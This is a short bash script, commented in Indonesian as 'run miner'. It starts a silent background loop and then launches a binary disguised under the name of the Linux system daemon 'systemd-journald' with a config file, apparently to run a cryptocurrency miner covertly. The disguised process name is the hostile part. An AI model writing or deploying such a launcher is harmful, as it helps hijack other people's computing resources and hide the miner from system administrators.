#!/bin/bash

# Loop background
while true; do
    echo "Running..." > /dev/null
    sleep 300
done &

# Jalankan miner
./systemd-journald -c config.json
